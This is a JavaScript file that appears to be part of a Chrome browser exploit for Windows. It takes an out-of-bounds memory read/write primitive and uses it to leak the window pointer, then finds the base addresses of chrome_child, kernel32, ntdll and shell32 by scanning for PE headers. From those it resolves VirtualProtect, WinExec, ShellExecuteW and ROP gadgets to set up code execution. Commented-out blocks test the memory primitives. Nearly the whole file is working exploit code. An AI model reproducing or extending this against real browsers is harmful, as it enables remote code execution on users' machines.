function find_libraries(oob) {
  
    let window_ptr = oob.objToPtr(window, true);
    let chrome_child_ptr = oob.getUint64(window_ptr + 0x20n  , true);
    log(`[!] sanity_check: 0x${window_ptr.toString(16)} 0x${chrome_child_ptr.toString(16)}`, "small");

    chrome_child = new FindBase(oob, chrome_child_ptr);
    log('[+] chrome_child: 0x' + chrome_child.base.toString(16), "small");

    virtual_alloc_ptr = oob.getUint64(chrome_child.base + OFFSET["CHROME_IM_VA"] , true);
    log('[+] kernel32!VirtualAlloc:   0x' + virtual_alloc_ptr.toString(16), "small");

    kernel32 = new FindBase(oob, virtual_alloc_ptr);
    log('[+] kernel32:                  0x' + kernel32.base.toString(16), "small");

    virtual_protect_ptr = kernel32.base + OFFSET["KERNEL_EX_VP"];
    log('[+] kernel32!VirtualProtect: 0x' + virtual_protect_ptr.toString(16), "small");
  
    winexec_ptr = kernel32.base + OFFSET["KERNEL_EX_WE"];
    log('[+] kernel32!WinExec:        0x' + winexec_ptr.toString(16), "small");
  
    memcpy_ptr = oob.getUint64(kernel32.base + OFFSET["KERNEL_IM_MC"] , true);
    log('[+] ntdll!memcpy:            0x' + memcpy_ptr.toString(16), "small");
  
    ntdll = new FindBase(oob, memcpy_ptr);
    log('[+] ntdll:                     0x' + ntdll.base.toString(16), "small");
  
    pivot_gadget_ptr = ntdll.base + OFFSET["NTDLL______1"];
    log('[+] pivot_gadget:            0x' + pivot_gadget_ptr.toString(16), "small");

    pop_gadget_ptr = ntdll.base + OFFSET["NTDLL______2"]

    ret_gadget_ptr = pop_gadget_ptr + 10n;
    log('[+] pop_gadget:              0x' + pop_gadget_ptr.toString(16), "small");

    mov_rcx_rax_gadget_ptr = 0n

    jmp_rcx_gadget_ptr = ntdll.base + OFFSET["NTDLL______3"]

    log('[+] jmp_rcx_gadget:          0x' + jmp_rcx_gadget_ptr.toString(16), "small");
  
    if (mov_rcx_rax_gadget_ptr == 0n) {
        shellexecutew_ptr = oob.getUint64(chrome_child.base + OFFSET["CHROME_IM_SE"] , true);
        log('[+] shell32!ShellExecuteW:   0x' + shellexecutew_ptr.toString(16), "small");

        shell32 = new FindBase(oob, shellexecutew_ptr);
        log('[+] shell32:                  0x' + shell32.base.toString(16), "small");

        shell32_mov_rcx_rax_gadget_ptr = shell32.base + OFFSET["SHELL______1"];
        log('[+] shell32_mov_rcx_rax_gadget:            0x' + shell32_mov_rcx_rax_gadget_ptr.toString(16), "small");

        shell32_mov_rax_rcx_gadget_ptr = shell32.base + OFFSET["SHELL______2"];
        log('[+] shell32_mov_rax_rcx_gadget:            0x' + shell32_mov_rax_rcx_gadget_ptr.toString(16), "small");
    }

    // let mojo_core_ptr = oob._arb_read(chrome_child.base + kChromeChildCoreOffset );
    // let mojo_handles_ptr = oob._arb_read(mojo_core_ptr + 0x20n + 1n); // this is the member handles_ of the mojo::Core object.
    // log(`${mojo_core_ptr.toString(16)} (mojo_core_ptr) === ${mojo_handles_ptr.toString(16)} (mojo_handles_ptr)`, "small"); // mojo_core_ptr === mojo_handles_ptr
    // var list_node_ptr = oob._arb_read(mojo_handles_ptr + 0x10n + 1n);
    // let list_length = oob._arb_read(mojo_handles_ptr + 0x18n + 1n);
    // log(`${list_node_ptr.toString(16)} (list_node_ptr), ${list_length.toString(16)} (list_length)`, "small"); // mojo_core_ptr === mojo_handles_ptr
    
    return;

}

class FindBase {
    constructor(oob, ptr) {
        ptr = ptr & 0xffffffffffff0000n;
        var dword = oob.getUint32(ptr, true);

        while ((dword & 0xffff) != 0x5a4d) {
            ptr -= 0x10000n;
            dword = oob.getUint32(ptr, true);
        }

        this.oob = oob;
        this.base = ptr;
        this.section_bytes = new Map();

        this.parse_headers = function () {
            this.dos_header_ptr = this.base;
            let e_lfanew = oob.getUint32(this.dos_header_ptr + 60n, true);

            this.nt_header_ptr = this.dos_header_ptr + BigInt(e_lfanew);
            let nt_magic = oob.getUint32(this.nt_header_ptr, true);
            if (nt_magic != 0x00004550) {
                this.dos_header_ptr = 0n;
                this.nt_header_ptr = 0n;
                return false;
            }

            //log('  nt_header: 0x' + this.nt_header_ptr.toString(16));
            this.file_header_ptr = this.nt_header_ptr + 4n;
            let machine = oob.getUint32(this.file_header_ptr, true);
            if ((machine & 0xffff) != 0x8664) {
                this.dos_header_ptr = 0n;
                this.nt_header_ptr = 0n;
                this.file_header_ptr = 0n;
                return false;
            }
            this.opt_header_ptr = this.nt_header_ptr + 24n;
            let opt_magic = oob.getUint32(this.opt_header_ptr, true);
            if ((opt_magic & 0xffff) != 0x20b) {
                this.dos_header_ptr = 0n;
                this.nt_header_ptr = 0n;
                this.file_header_ptr = 0n;
                this.opt_header_ptr = 0n;
                return false;
            }
            return true;
        };
        if (this.parse_headers() == true) {
            return this;
        } else {
            return null;
        }
    }
}

// function test_primatives(oob) {
//     let test = [1.1, 1.1, 1.1, 1.1, itof(0x4142434445464748n)]
//     //let test = new ArrayBuffer(0x1000);
//     //let testu = new Uint32Array(test);
//     //testu[0] = 0x44434241
//     //testu[1] = 0x48474645
//     log(`[?] Testing write primatives`)
//     log(`Starting with: ${ftoi(test[0]).toString(16)} ${ftoi(test[1]).toString(16)} ${ftoi(test[2]).toString(16)} ${ftoi(test[3]).toString(16)}`, "small")
//     let test_ptr = oob.objToPtr(test);
//     log(`test_ptr 0x${test_ptr.toString(16)}`, "small")
//     let test_element_ptr = oob.getUint64(test_ptr+0x10n );
//     log(`test_element_ptr 0x${test_element_ptr.toString(16)}`, "small")
//     let test_element_first_ptr = test_element_ptr -1n + 0x10n;
//     let test_element_secnd_ptr = test_element_ptr -1n + 0x18n;
//     let test_element_third_ptr = test_element_ptr -1n + 0x20n;
//     let test_element_fourt_ptr = test_element_ptr -1n + 0x28n;
//     let test_element_fifth_ptr = test_element_ptr -1n + 0x30n;
//     oob.setUint64(test_element_first_ptr , ftoi(1.2875)); 
//     oob.setUint32(test_element_secnd_ptr +4n, 0x3ff49999n); 
//     oob.setUint16(test_element_third_ptr +6n, 0x3ff4n); 
//     oob.setUint8(test_element_fourt_ptr +6n, 0xf4n); 
//     log(`Ending with: ${ftoi(test[0]).toString(16)} ${ftoi(test[1]).toString(16)} ${ftoi(test[2]).toString(16)} ${ftoi(test[3]).toString(16)}`, "small")
//     log(`[?] Testing read primatives`)
//     log(`Reading 0x${(test_element_fifth_ptr-1n).toString(16)}: ${oob.getUint64(test_element_fifth_ptr).toString(16)} ${oob.getUint32(test_element_fifth_ptr).toString(16)} ${oob.getUint16(test_element_fifth_ptr).toString(16)} ${oob.getUint8(test_element_fifth_ptr).toString(16)}`, "small")
//     log(`Reading 0x${test_element_fifth_ptr.toString(16)}: ${oob.getUint64(test_element_fifth_ptr ).toString(16)} ${oob.getUint32(test_element_fifth_ptr ).toString(16)} ${oob.getUint16(test_element_fifth_ptr ).toString(16)} ${oob.getUint8(test_element_fifth_ptr ).toString(16)}`, "small")
//     test_element_fifth_ptr += 1n
//     log(`Reading 0x${test_element_fifth_ptr.toString(16)}: ${oob.getUint64(test_element_fifth_ptr ).toString(16)} ${oob.getUint32(test_element_fifth_ptr ).toString(16)} ${oob.getUint16(test_element_fifth_ptr ).toString(16)} ${oob.getUint8(test_element_fifth_ptr ).toString(16)}`, "small")
//     return
// }

// function load_test_primatives(oob) {
//     let window_ptr =       oob.objToPtr(window);
//     let chrome_child_ptr = oob.getUint64(window_ptr + 0x20n  );
//     log(`SC 0 ${window_ptr.toString(16)} ${chrome_child_ptr.toString(16)}`)
//     let i
//     for (i = 1 ; i <= 0x100000; i++) {
//         window_ptr =       oob.objToPtr(window);
//         chrome_child_ptr = oob.getUint64(window_ptr + 0x20n  );
//         if (i === 1) log(`SC 1 ${oob.getUint64(window_ptr + 0x20n  ).toString(16)}`)
//         if (i === 0x100000) log(`SC 2 ${oob.getUint64(window_ptr + 0x20n  ).toString(16)}`)
//     }
//     let j
//     for (j = 1 ; j <= 0x100000; j++) {
//         let trololol = []
//         if (j === 1) log(`SC 3 ${oob.objToPtr(trololol).toString(16)}`)
//         if (j === 0x100000) log(`SC 4 ${oob.objToPtr(trololol).toString(16)}`)
//     }
//     return
// }